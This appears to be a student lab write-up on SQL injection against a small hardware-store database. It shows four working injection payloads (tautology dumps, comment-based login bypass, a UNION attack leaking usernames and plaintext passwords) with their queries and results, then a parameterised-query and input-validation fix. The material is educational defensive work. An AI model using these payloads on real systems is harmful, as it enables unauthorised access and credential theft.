TASK 3 - SQL Injection Attacks
===========================================

Attack 1 - Dump all products:
===========================================
PAYLOAD: searchProduct("' OR 1=1--")

QUERY: SELECT * FROM products WHERE name LIKE '%' OR 1=1--%'
RESULT: All 5 products returned including Cement (38000), Iron Sheet (110000), Paint (60000), Nails (12000), Timber (25000)

WHY IT WORKED: The OR 1=1 condition is always true, so the WHERE clause is bypassed. The -- comments out the rest of the query. This returns every single product including cost prices the attacker should never see.

Attack 2 - Login bypass with no password:
===========================================
PAYLOAD: login("admin'--", "anything")

QUERY: SELECT * FROM users WHERE username='admin'--' AND password='anything'
RESULT: { id: 1, username: 'admin', password: 'admin123', role: 'admin' }

WHY IT WORKED: The -- comments out the password check, so only the username condition matters. The attacker logs in as admin with any password.

Attack 3 - Always true login:
===========================================
PAYLOAD: login("' OR '1'='1", "' OR '1'='1")

QUERY: SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1'
RESULT: { id: 1, username: 'admin', password: 'admin123', role: 'admin' }

WHY IT WORKED: OR '1'='1' is always true. Returns the first user in the database with no valid credentials needed.

Attack 4 - UNION attack (steal user data):
===========================================
PAYLOAD: searchProduct("' UNION SELECT id, username, password, role FROM users--")

QUERY: SELECT * FROM products WHERE name LIKE '%' UNION SELECT id, username, password, role FROM users--%'
RESULT: Returns all products PLUS all users with their passwords:
- Products: Cement, Iron Sheet, Paint, Nails, Timber
- Users: admin/admin123/admin, fatuma/pass456/attendant, wasswa/pass789/manager

WHY IT WORKED: UNION combines results from the products table and the users table. The attacker can steal credentials through a search box.

TASK 4 - Fix with Parameterised Queries
===========================================

secure.js Code:
===========================================
const Database = require('better-sqlite3');
const db = new Database('nyondo_hardware.db');

function searchProductSafe(name) {
    const query = `SELECT * FROM products WHERE name LIKE '%' || ? || '%'`;
    const rows = db.prepare(query).all(name);
    return rows;
}

function loginSafe(username, password) {
    const query = `SELECT * FROM users WHERE username = ? AND password = ?`;
    const row = db.prepare(query).get(username, password);
    return row;
}

// Tests - All attacks return empty results
console.log('Test 1:', searchProductSafe("' OR 1=1--"));     // Returns []
console.log('Test 2:', searchProductSafe("' UNION SELECT id,username,password,role FROM users--")); // Returns []
console.log('Test 3:', loginSafe("admin'--", 'anything'));   // Returns undefined
console.log('Test 4:', loginSafe("' OR '1'='1", "' OR '1'='1")); // Returns null

db.close();

Why Parameterized Queries Prevent Injection:
===========================================
Parameterized queries (using ? placeholders) prevent SQL injection because they separate SQL code from data. When I use ? instead of f-strings or template literals, the database treats user input as pure data only, never as executable code. The input is automatically escaped and cannot change the structure of the query. Even if an attacker types malicious SQL like "OR 1=1--", it becomes just a string value being searched for, not part of the SQL command. With f-strings, the user input becomes part of the SQL command itself, allowing attackers to modify the query structure.

function validateInput(value, type) {
    if (type === 'name') {
        if (typeof value !== 'string') return false;
        if (value.length < 2) return false;
        if (/[<>;]/.test(value)) return false;
        return true;
    }
    if (type === 'username') {
        if (typeof value !== 'string') return false;
        if (value.length === 0) return false;
        if (/\s/.test(value)) return false;
        return true;
    }
    if (type === 'password') {
        if (typeof value !== 'string') return false;
        if (value.length < 6) return false;
        return true;
    }
    return true;
}

// Validation is called BEFORE the database query
function searchProductSafe(name) {
    if (!validateInput(name, 'name')) {
        console.log(`Error: Invalid name input rejected`);
        return [];
    }
    const query = `SELECT * FROM products WHERE name LIKE '%' || ? || '%'`;
    return db.prepare(query).all(name);
}

function loginSafe(username, password) {
    if (!validateInput(username, 'username')) {
        console.log(`Error: Invalid username rejected`);
        return null;
    }
    if (!validateInput(password, 'password')) {
        console.log(`Error: Invalid password rejected`);
        return null;
    }
    const query = `SELECT * FROM users WHERE username = ? AND password = ?`;
    return db.prepare(query).get(username, password);
}
